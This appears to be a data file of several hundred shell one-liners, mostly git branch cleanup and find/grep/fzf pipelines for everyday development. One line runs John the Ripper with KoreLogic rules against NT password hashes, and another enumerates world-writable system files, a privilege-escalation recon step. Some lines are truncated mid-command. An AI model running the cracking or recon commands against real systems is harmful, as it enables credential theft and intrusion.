"git branch | peco | sed -e ""s/\* //g"" | awk ""{print \$1}"""
"git branch | grep \* | cut -f2 -d "" "" | pbcopy"
"git branch | grep \* | cut -d "" "" -f2 | xargs bash -cil "
"git branch | grep \* | cut -d "" "" -f2 | xargs -I{} sh -cv ""git checkout master; git branch -D {};"""
"git branch | grep \* | cut -d "" "" -f2 | pull_request"
"git branch | grep \* | awk ""{print \$2}"" | xargs git push origin"
"git branch | grep \* | awk ""{print \$2}"" | xargs git pull origin"
"git branch | grep \* | awk ""{print \$2}"" | xargs git pull --rebase origin"
"git branch | grep -vE ""(master|develop)"" | xargs git branch -D"
"git branch | grep -v master | grep -v ""*"" | xargs git branch -d"
"git branch | grep -v ""master|aaa"" | xargs git branch -D"
"git branch | grep -v ""master\|develop"" | xargs git branch -D"
"git branch | grep -v ""master""| grep -v ""develop"" | xargs git branch -D"
"git branch | grep -v ""master"" | grep -v ""development"" | xargs git branch -D"
"git branch | grep -v ""master"" | grep -v ""develop"" | xargs git branch -D"
"git branch | grep -v ""master"" | grep -v ""develop"" | xargs git branch -D && git fetch origin --prune"
"git branch | grep -v ""master"" | grep -v ""develop"" | xargs git branch -D "
"git branch | grep -v ""master"" | grep -v ""dev"" | xargs git branch -D"
"git branch | grep -v ""master"" | grep -v ""*"" | xargs git branch -D"
"git branch | grep -v ""develop\|master"" | xargs git branch -D"
"git branch | grep -v ""develop"" | grep -v ""release"" | xargs git branch -D"
"git branch | grep -v ""develop"" | grep -v ""master"" | xargs git branch -D"
"git branch | grep -v ""develop"" | grep -v ""master"" | xargs
"git branch | grep -v ""dev"" | grep -v ""prod"" | grep -v ""\*"""
"git branch | grep -e ^* | awk ""{ print \$2 }"" | pbcopy"
"git branch | grep -e ""^*"" | cut -d"" "" -f 2 | xargs git push origin"
"git branch | grep -e ""^*"" | cut -d"" "" -f 2 | xargs -n 1 -I branch_name git push origin branch_name --force-with-lease"
"git branch | grep -e ""^*"" | cut -d"" "" -f 2 | xargs -I {} git pull origin {} --rebase"
"git branch | grep -E ""\* (.+)"" | sed ""s/* //"" | xargs git push -u origin"
"git branch | grep ""*"" | sed ""s/* //"" | xargs git push origin "
"git branch | grep ""*"" | sed ""s/* //"" | xargs git pull origin "
"git branch | grep ""*"" | cut -d "" "" -f 2 | pbcopy"
"git branch | grep ""* "" | awk ""{print \$2}"" | xargs git push --set-upstream origin "
"git branch | fzf-tmux | tr -d ""*"" | tr -d ""\n"""
"git branch | egrep -v ""\*| master"" | xargs git branch -D"
"git branch | egrep -v ""(master|develop)"" | xargs git branch -D"
"git branch | egrep -v ""(master|\*)"" | xargs git branch -D"
"git branch -vv | grep "": gone]"" | awk ""{print $1}"" | xargs git branch -D"
"git branch -vv | command grep ""origin/.*: gone]"" | command sed ""s/\*//"" | command awk "
"git branch -r | fzf --multi | sed ""s/\// :/"" | xargs git push"
"git branch -r --merged | sed ""s/.*origin\///"" | grep -v ^master$ | xargs -n 1 git push origin --delete"
"git branch -r --merged | grep -v master | sed ""s/origin\///"" | xargs -n 1 git push --delete origin"
"git branch -r --merged | grep -v master | sed ""s/\// /"" | xargs -r -n 2 git push --delete"
"git branch -r --merged | awk -F'/' '/^ *origin/{if(!match($0, /(>|master)/)){print $2}}' | xargs git push origin --delete"
"git branch -r --merged master | grep -v -e master -e develop | sed -e ""s% *origin/%%"" | xargs -I% git push --delete origin %"
"git branch -d $(git branch --merged | grep -v ""^*"" | grep -v ""master"" | tr -d ""\n"")"
"git branch -a | grep -v ""remotes/origin/HEAD"" | tr -d \* | xargs git grep"
"git branch -a | grep -v ""origin/master"" | grep -v ""* "" | sed -e ""s;remotes\/origin\/;;"""
"git branch -D $(git branch | sed ""s/*//g"" | sed ""s/ //g"" | peco)"
"git branch --remote | sed ""s/[ \*]\+//"" | sed ""s/ \->.*$//"" | peco"
"git branch --no-color 2> /dev/null | sed -e ""/^[^*]/d"" -e ""s/* \(.*\)/\1/"" | tr -d ""\n"" | pbcopy"
"git branch --merged|grep -v -E ""\*|master""|xargs -n1 -I{} git branch -d {}"
"git branch --merged| egrep -v ""(^\*|master)"" | xargs --interactive git branch -d"
"git branch --merged |grep -v ""*"" | grep -v ""develop"" | grep -v ""master"""
"git branch --merged | grep -vE ""master"" | grep -vE ""\*"" | command xargs -n 1 git branch -d"
"git branch --merged | grep -v master | grep -v ""\*"" | xargs -r git branch -d"
"git branch --merged | grep -v ^\* | sed ""s/^ *//"" | xargs -n 1 git accept"
"git branch --merged | grep -v \* | grep -v ""^\s*master$"" | xargs git branch -d"
"git branch --merged | grep -v -E ""(master|\*)"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""releases/"" | grep -v ""\*"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""master"" | grep -v ""\*"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*\|master"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep features/ | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v master | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v ""master"" | xargs -n 1 git branch -d; git remote prune origin"
"git branch --merged | grep -v ""\*"" | grep -v ""master"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -v ""master"" | grep -v ""rails5_"""
"git branch --merged | grep -v ""\*"" | egrep -v ""(master|develop)"""
"git branch --merged | grep -v ""*"" | grep -ve ""^\s*master$"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""(^\*|master)"" | xargs git branch -d"
"git branch --merged | grep -E -v ""^\*? master$"" | sed ""s/ *//"" - | xargs git branch -d"
"git branch --merged | egrep -v ""(master|develop)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|dev)"""
"git branch --merged | egrep -v ""(^\*|master)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master)"" | xargs git branch -d ; git remote prune origin"
"git branch --merged | egrep -v ""(^\*|local)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|`default_branch_git`)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(\*|master)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(\*|$(git-branch-default))"" | xargs git branch -d"
"git branch --merged | command grep -vE ""^(\*|\s*master\s*$)"" | tr -d "
"git branch --merged | command grep -vE ""^(\*|\s*master\s*$)"" | command xargs -n 1 git branch -d"
"git branch --merged | command grep -vE ""^(*|\smaster\s$)"" | command xargs -n 1 git branch -d"
"git branch --merged | ack --invert-match ""\*|master"" | xargs git branch -d"
"git branch --merged origin/master | grep -v ""^\s*master"" | grep -v ""^*"" | xargs git branch -D"
"git branch --merged master | grep -vE ""^\*|master$"" | xargs -I % git branch -d %"
"git branch --merged master | grep -vE ""^\*|^ master$"" | xargs git branch -d"
"git branch --merged master | grep -v ""master$"" | grep -v ""develop$"" | grep -v ""staging$"""
"git branch --merged master | grep -v ""master"" | grep -v ""\*"" | xargs -n 1 git branch -d"
"git branch --merged master | grep -v ""^\*\| master"" | xargs -n 1 git branch -d"
"git branch --merged master | grep -v ""\smaster$"" | grep -v ""*"" | xargs git branch -d"
"git branch --merged master | grep -v ""\* master"" | grep -v ""master"" | xargs -n 1 git branch -d"
"git branch --merged development | egrep -v ""(^\*|master|dev)"""
"git branch --merged develop | grep -vE ""develop|master"" | xargs git branch -D"
"git branch --merged develop | grep -v ""develop"" | grep -v ""master"" | xargs -n 1 git branch -d"
"git branch --merged develop | egrep -v ""develop|master"" | xargs -n 1 git branch -d"
"git br | egrep -v ""\*| master"" | xargs git br -D"
"git add `(git status | grep ""modified:\|new file:"" | awk -F"": """
"git add $(git ls-files -u | awk ""{print $4}"" | sort | uniq)"
"git add $(git -c color.status=always status --short | sed -E ""s/(.{2}) (.*)/\1: \2/"" | fzf --ansi --nth=2 --tac --no-sort --delimiter="":"" --bind=ctrl-a:toggle-all --multi --preview ""~/misc/dotfiles/diff-or-cat.sh {2}"" | cut --delimiter="":"" --fields=2)"
"gistit | awk ""{print $3}"" | xclip && xclip -o | xargs xdg-open"
"gist -r $(gist -l tzmfreedom | peco | awk ""{ print \$1 }"" | sed -e ""s@https://gist.github.com/@@g"")"
"gist -P $(gist -l tzmfreedom | peco | awk ""{ print \$1 }"" | sed -e ""s@https://gist.github.com/@@g"")"
"gim && git fetch -p && git branch -vv | grep "": gone]"" | awk ""{print \$1}"" | xargs git branch -D && echo Nick is cool!"
"gi $(gi list | gsed ""s/,/\n/g"" | peco | gsed ""N; s/\n/,/g"")"
"ghq list --full-path | grep ""ghq"" | fzf > /dev/null | cd"
"gfa --prune && gbl | grep ""\[gone\]"" | cut -d "" "" -f3 | xargs git branch -d"
"getent passwd | awk -F : ""\$3 >= $(grep UID_MIN /etc/login.defs | cut -d "" "" -f 2) { print \$1 }"" | sort"
"gco $(git for-each-ref --format=""%(authorname) %09 %(refname:short)"" --sort=authorname | sed ""/origin/d"" | peco | awk ""{print \$NF}"")"
"gcloud config configurations activate $(gcloud config configurations list | tail -n +2 | peco | cut -d "" "" -f 1)"
"gch $(git ls-files -m | fzf --preview ""git diff --color {} | diff-so-fancy"" | sed -e ""s/^.{1,3}[[:space:]]//"") && gss"
"gbr | sed -e ""s@origin/@@"" | grep -v grep | grep $@"
"gbm && (gbm | xargs git branch -d) || echo ""Nothing to remove"""
"gb | selecta | cut -d ""/"" -f 2 | xargs git checkout"
"gb | grep nwhyte | sed ""s/^\*//"" | sed ""s/^\ *//"""
"g ""(todo\|TODO\|fixme\|FIXME)"""
"fzf --preview ""(bat --style=numbers --color=always {} || cat {}) 2> /dev/null | head -500"" --bind ""ctrl-e:execute(vim {})"""
"fzf --bind=""enter:execute(echo -n {} | pbcopy)"" --preview=""pygmentize {} 2>/dev/null || cat {}"" --preview-window=up"
"function _t() {echo Filtering:$1; adb logcat -vtime | grep `adb shell ""ps | grep $1"" | cut -c10-15`}; _t"
"function _stash(){ git remote show origin | grep ""Fetch URL:"" | cut -d"" "" -f 5 | xargs google-chrome; };_stash"
"function _parseLog(){ zcat $1 | sed -r ""s/.*line\"":(.*),\""host.*/\1/"" | bunyan | subl - ;};_parseLog"
"function _largest() { find . -name ""*.$@"" | xargs wc -l | sort -nr -k5 | head -n 25; unset -f _largest; }; _largest"
"function _killport(){ lsof -n -i4TCP:$@ | grep LISTEN | awk ""{print \$2}"" | xargs kill};_killport"
"function _kgpodnamefirst(){ kubectl get po | cut -d"" "" -f1 | ack $1 | head -n 1; };_kgpodnamefirst"
"function _gloh() { git log --date=short --pretty=format:""%cd | %h | %s"" $1 |head; }; _gloh"
"function _blah(){ git show ""$(git annotate $1 | grep $2 | head -1| cut -f1)""; };_blah"
"function _bitbucket(){ git remote show origin | grep ""Fetch URL:"" | cut -d"" "" -f 5 | xargs google-chrome; };_bitbucket"
"function __journalctl__(){ journalctl -n $1 -fu griffin.* |tee grffnLog$(date +%d%b_%H%M).txt | sed ""s/ultimakersystem-ccbdd3000... python3.4//""|grep -iv http ; };__journalctl__"
"function Changes() { git status | grep -E ""deleted|modified|new file""; git ls-files . --exclude-standard --others; }; Changes"
"func() { v $(echo '$(grep -lr --exclude-dir={.git,.idea,.vscode} $@ err.txt generated.file succ.txt | fzf || echo -h)'); }; func"
"func() { v $(echo '$(grep -lr --exclude-dir={.git,.idea,.vscode} $@ err.txt generated.file succ.txt | fzf -m || echo -h)'); }; func"
"func() { n $(echo '$(grep -lr --exclude-dir={.git,.idea,.vscode} $@ err.txt generated.file succ.txt | fzf || echo -h)'); }; func"
"func() { n $(echo '$(grep -lr --exclude-dir={.git,.idea,.vscode} $@ err.txt generated.file succ.txt | fzf -m || echo -h)'); }; func"
"fortune | $(echo -e ""cowsay\ncowthink"" | shuf -n1) -f $(for w in `cowsay -l` ; do echo $w ; done | sed "
"for usr in $(qstat -u ""*"" | tr -s "" "" | cut -d"" "" -f 5 | sort -u); do finger ""$usr""; echo """"; done"
"for ss in `tmux ls|grep ""^t[0-9]\+:""|grep -v attached|cut -d: -f1`; do tmux kill-session -t ""$ss""; done"
"for ruleset in `grep KoreLogicRules /etc/john/john.conf | cut -d: -f 2 | cut -d\] -f 1`; do find /root/dic/ -name ""*"" | xargs -t -I dic john -fork:8 --rules:${ruleset} -w:dic --format:nt nt; done"
"for repo in ~/repos/*; do [ -d ""$repo"" ] && cd ""$repo"" && git status >&/dev/null || continue; git diff --name-only 2>&1 | sed -e ""s/^/$(basename ""$repo""): /""; cd - >/dev/null; done"
"for l in $(ls -d msg-* | xargs); do cd $l; printf ""%-30s | %-30s\n"" ""$l"" ""$(git tag -l | tail -n 1 )"" ; cd .. ; done"
"for l in $(ls -d msg-* | xargs); do cd $l; printf ""%-30s | %-30s\n"" ""$l"" ""$(git br | grep \*)"" ; cd .. ; done"
"for k in `git branch|perl -pe s/^..//`;do echo -e `git show --pretty=format:""%Cgreen%ci %Cred%cr%Creset"" $k|head -n 1`\\t$k;done|sort -r"
"for k in `git branch|perl -pe s/^..//`;do echo -e `git show --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k|head -n 1`\\t$k;done|sort -r"
"for k in `git branch|perl -pe s/^..//`;do echo -e `git show --pretty=format:""%Cgreen%ci %C(cyan)%cr%Creset"" $k|head -n 1`\\t$k;done|sort -r"
"for k in `git branch|perl -pe s/^..//`; do echo -e ` git show --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k|head -n 1`\\t$k;done|sort -r"
"for k in `git branch|perl -pe ""s/^..//""`;do echo -e `git show --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k|head -n 1`\\t$k;done|sort -r"
"for k in `git branch | sed s/^..//`; do echo -e `git log -1 --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k --`\\t""$k"";done | sed ""s/minutes ago/mins ago/"" | sort"
"for k in `git branch | perl -pe s/^..//`; do echo -e `git show --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k -- | head -n 1`\\t$k; done | sort"
"for k in `git branch | perl -pe s/^..//`; do echo -e `git show --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k -- | head -n 1`\\t$k; done | sort -r"
"for k in `git branch -r|sed -e""s/ ->.*//""|sed s/^..//`;do echo -e `git log -1 --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" ""$k"" --`\\t""$k"";done|sort -r"
"for k in `git branch -r | perl -pe ""s/^..(.*?)( ->.*)?$/\1/""`; do echo -e `git show --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k -- | head -n 1`\\t$k; done | sort -r"
"for k in `git branch -a|perl -pe s/^..//`;do echo -e `git show --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k|head -n 1`\\t$k;done|sort -r"
"for k in $(git branch|perl -pe s/^..//);do echo -e $(git show --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $k|head -n 1)\\t$k;done|sort -r"
"for k in $(git branch -a --merged|grep -v ""\->""|sed s/^..//);do echo -e $(git log -1 --pretty=format:""%Cgreen%ci %Cred%cr%Creset"" ""$k"")\\t""$k"";done|sort"
"for idx in $(docker images | grep -iv ""TAG"" | grep -i ""<none>"" | awk "
"for i in `ls /Users/nsunil/Work/Repos/|grep -E ""myctb|aws""`; do cd /Users/nsunil/Work/Repos/$i; printf ""\033[0;33mProject: $i\033[0m - ""; git status | tail -n 1; cd ../; done"
"for i in `ls /Users/nsunil/Work/Repos/|grep -E ""myctb|aws""`; do cd /Users/nsunil/Work/Repos/$i; printf ""\033[0;33mProject: $i\033[0m - ""; git pull; git status | tail -n 1; cd ../; done"
"for i in `find ~/repos -name .git | grep -v forge` ; do cd $i/../ ; git status | grep ""On branch"" | grep -v master ; done"
"for i in G M K; do du -ah | grep ""[0-9]$i"" | sort -nr -k 1; done | head -n 11"
"for i in $(env | grep AWS | grep -v AWS_HOME | cut -f 1 -d""=""); do unset $i; done"
"for fprint in $(gpg --list-public-keys --fingerprint --with-colons |grep fpr|cut -d: -f10); do echo ""$fprint:6:"" | gpg --import-ownertrust; done"
"for file in /proc/1/status /proc/1000536/status /proc/1001394/status /proc/106/status /proc/948228/status /proc/self/status /proc/thread-self/status ; do awk /VmSwap\|Name/\{printf\ \$2\ \""\ \""\ \$3\}END\{\ print\ \""\""\ \} $file; done | sort -k 2 -n -r | less"
"for file in *.(jpg|png|bmp|jpeg); do convert ""$file"" -quality 90 -resize 30% ""web_$file""; done"
"for file in $(ga find --not --in glacier); do echo $file | sed -e ""s,/.+,,""; done | sort | uniq -c"
"for f in $(ls -1 *_FM.zip) ; do echo -n ""$f : "" ; 7z x -so $f $( unzip -l $f |grep scan_duration.txt |awk ""{ print \$4; }"" ) |grep ""FM scan found"" ; done"
"for f in $(ls -1 *_FM.zip) ; do echo -n ""$f : "" ; 7z x -so $f $( unzip -l $f |grep scan_duration.txt |awk ""{ print \$4; }"" ) |grep ""FM scan duration"" ; done"
"for f in $(ls -1 *_DAB.zip) ; do echo -n ""$f : "" ; 7z x -so $f $( unzip -l $f |grep scan_duration.txt |awk ""{ print \$4; }"" ) |grep ""DAB scan found"" ; done"
"for f in $(ls -1 *_DAB.zip) ; do echo -n ""$f : "" ; 7z x -so $f $( unzip -l $f |grep scan_duration.txt |awk ""{ print \$4; }"" ) |grep ""DAB scan duration"" ; done"
"for f in $(/bin/ls); do new=$(echo $f | cut -d""."" -f 1-1 | md5); rest=$(echo $f | cut -d""."" -f 2-); mv $f $new.$rest; done"
"for dir in `ls -d /srv/cvn/services/cvnbot/* | sort -V`; do name=$(basename ""$dir""); echo; echo ""# $name""; (sudo cat /var/log/syslog | grep $name | tail -n10); done;"
"for d in `find ~/.ssh/* -type d`; do ssh-add -t16h `find $d -type f -not -name ""*.pub"" -exec stat -f ""%m {}"" {} \; | sort -n | tail -1 | cut -f2- -d"" ""`; done"
"for d in $(p4 users | cut -f1 -d\ ); do echo -n $d: ; p4 changes -u $d | wc -l ; done | sort -k 2,2 -n"
"for c in `git branch|perl -pe s/^..//`;do echo -e `git show --pretty=format:""%Cgreen%ci %Cblue%cr%Creset"" $c|head -n 1`\\t$c;done|sort -r"
"for c in `brew cask list`; do ! brew cask info $c | grep -qF ""Not installed"" || { brew cask uninstall $c && brew cask install $c; }; done"
"for c in `brew cask list`; do ! brew cask info $c | grep -qF ""Not installed"" || echo $c; done"
"for c in `brew cask list`; do ! brew cask info $c | grep -qF ""Not installed"" || brew cask uninstall $c --force && brew cask install $c; done"
"for c in `brew cask list`; do ! brew cask info $c | grep -qF ""Not installed"" || brew cask install $c; done;brew cask cleanup"
"for c in `brew cask list`; do ! brew cask info $c | grep -qF ""Not installed"" || brew cask install $c; done"
"for c in `brew cask list`; do ! brew cask info $c | grep -qF ""Not installed"" || brew cask install $c; done && brew-cask-clean-outdated"
"for branch in `git branch -r | grep -v HEAD`;do echo -e `git show --format=""%ci %cr"" $branch | head -n 1` \\t$branch; done | sort"
"for branch in `git branch -r | grep -v HEAD`;do echo -e `git show --format=""%ci %cr"" $branch | head -n 1` \\t$branch; done | sort -r"
"for branch in `git branch -r | grep -v HEAD`;do echo -e `git show --format=""%ci %cr (%cn)"" $branch | head -n 1` \\t$branch; done | sort -r"
"for branch in `git branch -r | grep -v HEAD`;do echo -e `git show --format=""%an ---> %ai %ar"" $branch | head -n 1` \\t$branch; done | sort -r"
"for branch in `git branch -r | grep -v HEAD`;do echo -e `git show --format=""%ai %ar by %an"" $branch | head -n 1` \\t$branch; done | sort -r"
"for branch in `git branch -r --no-merged | grep -v HEAD`; do echo -e `git show --format=""%ci %cr %an"" $branch | head -n 1` \\t$branch; done | sort -r"
"for branch in `git branch -r --merged | grep -v HEAD`; do echo -e `git show --format=""%ci %cr %an"" $branch | head -n 1` \\t$branch; done | sort -r"
"for branch in `git branch -l | grep -v HEAD`;do echo -e `git show --format=""%ci %cr"" $branch | head -n 1` \\t$branch; done | sort -r"
"for branch in $(git branch -r | grep -v HEAD);do echo -e $(git show --format=""%ci"" $branch | head -n 1) \\t$branch; done | sort -r"
"for VAG in $(vg|grep running|awk ""{print $1}""|tr ""\n"" "" ""); do vagrant halt $VAG; done"
"for VAG in $(vg|grep running|awk ""{print $1}""| tr ""\n"" "" ""); do vagrant provision $VAG; done"
"for VAG in $(vg|grep running|awk ""{print $1}""| tr ""\n"" "" ""); do vagrant destroy $VAG; done"
"for VAG in $(vg|grep running| awk ""{print $1}""|tr ""\n"" "" ""); do vagrant up $VAG; done"
"fold -w1 ""$@"" | sort | uniq -c | sort -rn"
"find ~/Sites/DevOps/ -name terraform.tfstate | xargs -L1 ls -l | sort -rk5 --numeric-sort | awk ""{if( \$5 > 10000) print \$0}"""
"find ~/ -type f -mtime -5 -printf ""%T+ %p\n"" | grep -v ""\/\."" | sort -nr | cut -c 1-19,31-"
"find app | grep ""\.rb"" | sed -e ""s/^app/spec/g"" -e ""s/\.rb/_spec\.rb/g"" | xargs touch"
"find app -name *.rb* -print0 -o \( -name *.html* -a ! -path *kaminari* -a ! -path *devise* -print0 \) -o -name *.css* -print0 -o \( \( -name *.js* -o -name *.coffee* \) -a ! -path *libs* -a ! -path *libraries* -a ! -path *plugins* -print0 \) | xargs -0 cat | sed ""/^\s*$/d"" | wc -l"
"find /proc -name io |xargs egrep ""write|read""|sort -n -k 2"
"find /home -type f -printf ""%s\t%p\n"" |sort -rn |head -n20 |less"
"find / -writable -type f 2>/dev/null | grep -vE ""^$HOME"" | grep -vE ""^/sys|^/proc/"""
"find ./ -type f | egrep ""\.c$"" | shuffle | tail -n 1"
"find . |grep -v svn| grep -v ""~$""| xargs grep -n"
"find . | grep migrations | grep ""/[0-9]\+"" | grep -v "
"find . | grep -wE ""py[co]|__pycache__"" | xargs rm -rvf"
"find . | grep -v node_modules | grep "".js$"" | xargs ctags --tag-relative=yes --fields=+akst"
"find . | grep -E ""py[co]|__pycache__"" | xargs rm -rvf"
"find . | grep -E ""(__pycache__|\.pyc$)"" | xargs rm -rf"
"find . | grep ""\(php\|html\)$"" | xargs -Ifoo php -l foo"
"find . | egrep ""\.rej|\.orig"" | xargs rm"
"find . | ag "".+/(obj)$"" | sed ""s/\r\n/\n/"" | while read dir; do rm -r $dir; done;"
"find . -xdev -not -iwholename ""*.git*"" -type f | egrep -o -E ""\.{1}\b[A-Z]\w*\b$"" | sort | uniq -c"
"find . -type l | (while read FN ; do test -e ""$FN"" || ls -ld ""$FN""; done)"
"find . -type f | xargs -I {} bash -c ""iconv -f utf-8 -t utf-16 {} &>/dev/null || echo {}"""
"find . -type f | sed -e ""s/ /\\\\ /g"" | sort -R | head -1"
"find . -type f | sed -e ""/\/\./ d"" | sed ""/^/ {s/^/\""/; s/$/\""/; p}"" | xargs grep -n"
"find . -type f | sed ""s/.*\.//"" | sort | uniq -c"
"find . -type f | grep -v "".svn"" | grep -v ""\.git"" | xargs egrep -n --color=ALWAYS"
"find . -type f | grep -v "".svn"" | grep -v ""\.git"" | xargs egrep -n --color=ALWAYS -w"
"find . -type f | grep -v "".svn"" | grep -v ""\.git"" | xargs egrep -n --color=ALWAYS -i"
"find . -type f | grep -v "".svn"" | grep -v ""\.git"" | xargs egrep -n --color=ALWAYS -i -w"
"find . -type f | grep -v "".git"" | xargs du -b | sort -rn"
"find . -type f -size +1c -links 1 -print0 | xargs -0 -i md5sum ""{}"" | md5dups | sort -f"
"find . -type f -size +1000k -exec ls -lk {} \; | awk '{print \$5, \$9}' | sort -nr +1 | head"
"find . -type f -regextype posix-egrep -regex "".*\.(cpp|pde|ino|h)$"" >! cscope.files; cscope -b -k; ctags -R -n -e"
"find . -type f -printf ""%T@ %p\n"" | sort -rn | head -1 | cut -f2- -d"" """
"find . -type f -printf ""%T@ %p\n"" | sort -n | tail -1 | cut -f2- -d"" """
"find . -type f -printf ""%T@ %p\n"" | sort -k 1nr | sed ""s/^[^ ]* //"" | head -n 50"
"find . -type f -print0 | xargs -0 stat -f ""%m %N"" | sort -rn | cut -f2- -d"" """
"find . -type f -print0 | grep -zZ -v ""\.git"" | grep -zZ -v "".*\.svn-base$"" | xargs -0 grep --color=always -H -e"
"find . -type f -print0 | grep -zZ -v ""\.git"" | grep -zZ -v "".*\.svn-base$"" | xargs -0 fgrep --color=always -H"
"find . -type f -print0 | grep --color=no -zaiE "".*\.(js|ts)$"" | xargs -0 grep -aHn --color=$COLOR_FLAG"
"find . -type f -print | grep -v "".git"" | xargs -n 1 basename | awk -F\. "
"find . -type f -name ""*.ts"" | fgrep -v /node_modules/ | fgrep -v /typings/ | sources"
"find . -type f -name ""*.pyc"" | xargs rm -f || true"
"find . -type f -name ""*.json"" | fgrep -v /node_modules/ | fgrep -v /typings/ | sources"
"find . -type f -name ""*.js"" | fgrep -v /node_modules/ | fgrep -v /typings/ | sources"
"find . -type f -name ""*.html"" | grep -v bin | grep -v target | grep -i "
"find . -type f -name ""*.go"" | grep -v test | grep -v .gen | grep -v vendor"
"find . -type f -exec stat -f ""%m %N"" {} \; | sort -n | tail -1 | cut -f2- -d"" """
"find . -type d | while read dir; do; echo ""$dir"" : $(find ""$dir"" -type f | wc -l); done | sort -k2 -t "":"" -n"
"find . -type d -name vendor -prune -or -name ""*.php"" -print0 | xargs -0 -n1 -P32 -I{} sh -c ""php -derror_log= -ddisplay_startup_errors=1 -ddisplay_errors=1 -l {} || true"""
"find . -type d -name ""node_modules"" -prune -o -type f -not -name ""*.swp"" -not -name ""*.pyc"" | sed ""s/$/\""/g"" | sed ""s/^/\""/g"" | xargs grep --color "
"find . -regextype ""egrep"" -regex "".*\.(h|hh|inc)$"" -print0 | xargs -0 grep"
"find . -regex "".*\.[cChH]\(pp\)?\|.*\.py"" -print | cut -c3- | etags -"
"find . -print0 | grep -v ""\.git"" | grep -v ""\.svn"" | xargs echo -0 -n25 -P20 grep -H "
"find . -print | sed '1d;s,[^/]*/,| ,g;s/..//;s/[^ ]*$/|--- &/'"
"find . -name "".venv"" | egrep "".*"" || python3 -m venv .venv && pva && pip install -U pip"
"find . -name ""*akefile"" |grep -v svn| grep -v ""~$""| xargs grep -n"
"find . -name ""*265*.mkv"" -type f | wc -l && find -name ""*.mkv"" | wc -l && find -name ""*encarne-failed*"" | wc -l"
"find . -name ""*.tcl"" |grep -v svn| grep -v ""~$""| xargs grep -n"
"find . -name ""*.swp"" -print0 | xargs -0 rm -rf; find . -name ""*.swn"" -print0 | xargs -0 rm -rf; find . -name ""*.swo"" -print0 | xargs -0 rm -rf"
"find . -name ""*.py"" | grep -ve \/migrations\/ | xargs -n 1 -t pycodestyle --max-line-length 120 >| out"
"find . -name ""*.ksh*"" -o -name ""*.bash*"" -o -name ""*.sh*"" |grep -v svn| grep -v ""~$""| xargs grep -n"
"find . -name ""*.js"" |grep -v svn| grep -v ""~$""| xargs grep -n"
"find . -name ""*.js"" -o -name ""*.css"" -o -name ""*.json"" -o -name ""*.html"" -o -name ""*.*ss"" -type f | grep -v "".node_modules"" | grep -v "".meteor"" | xargs grep -nHi "
"find . -name ""*.html"" |grep -v svn| grep -v ""~$""| xargs grep -n"
"find . -name ""*.h"" |grep -v svn| grep -v ""~$""| xargs grep -n"
"find . -name ""*.ftn*"" -o -name ""*.cdk*"" |grep -v svn| grep -v ""~$""| xargs grep -n"
"find . -name ""*.c"" |grep -v svn| grep -v ""~$""| xargs grep -n"
"find . -name ""*.[ch]"" | xargs dos2unix; find . -name ""*.[ch]"" | xargs indent -bad -bap -bl -bli0 -ce -ci4 -i4 -nbbo -ncdb -bfda -nhnl -nlp -nsc -nip -npcs -nut -kr; find . -name ""*.*~"" | xargs rm -f"
"find . -maxdepth 1 -type f -exec stat -f ""%m {}"" {} \; | sort -n | tail -n 1 | cut -d "
"find . -maxdepth 1 -type f -exec stat --format ""%Y :%y %n"" ""{}"" \; | sort -nr | cut -d: -f2- | head"
"find . -maxdepth 1 -type d | sort | while read -r d; do printf ""%5d %s\n"" `find ""$d"" -type f | wc -l` $d; done"
"find . -maxdepth 1 -name ""*.c"" -type f -exec echo ""{}"" \; -exec cat ""{}"" \; | grep ""^[a-z\.].*[^;]$"" | grep -v ""typedef"" | sed -e ""s/$/;/"" -e ""s/\t\t/\t/"" -e ""s/^.\//\n\/* Function(s) in file /"" -e ""s/.c;$/.c *\//"""
"find . -iregex "".+\.\(c\|cpp\|h\)$"" -type f -print0 | xargs -0 uncrustify -c ~/.uncrustify4cpp.cfg --no-backup"
"find . -iregex "".*mk\|.*GNUmakefile\|.*Makefile"" | xargs grep --color=auto"
"find -type f -maxdepth 1 -name ""[^\.]*"" -print0 | xargs -0 du -sc | sed ""s/\.\///"" | sort -n"
"find -type f -iregex "".*/.*\.\(ogg\|mp3\|flac\)"" -print0 | xargs -0 mid3iconv -e cp949"
"find -type d -maxdepth 1 -name ""[^\.]*"" -print0 | xargs -0 du -sc | sed ""s/\.\///"" | sort -n"
"find -maxdepth 1 -links 1 | grep -v ""\ [0-9]\{1,2\}x[0-9]\{1,2\}\ \|^.*.part$"" | sort"
"find -E . -type f -iregex "".*(mov|m4v|mp4|avi)"" -exec rsync -avR --remove-source-files {} /tmp/test \;"
"find -E . -iregex "".*\.(jpg|jpeg|png|gif)"" -exec python -c ""from PIL import Image; image = Image.open(\""{}\""); image.save(\""{}\"", quality=50, optimize=True);"" \;"
"find err.txt generated.file succ.txt | peco | tr -d ""\n"" | xclip "
"find $HOM_VID/* -type f -print0 | sed s/*\//g;s/^/""/;s/$/"" | fzf -d/ -n3.. --height=10 | xargs -r -0 vlc"""
"find $DIR -type f -printf ""%T@ %p\n"" | sort -n | tail -n 1 | cut -d"" "" -f 2 "
"find $1 -type f -exec stat --format ""%Y :%y %n"" ""{}"" \; | sort -nr | cut -d: -f2- | head"
"find $(echo $PATH | tr "":"" ""\n"") | awk -F / ""{print \$NF}"" | sort -u"
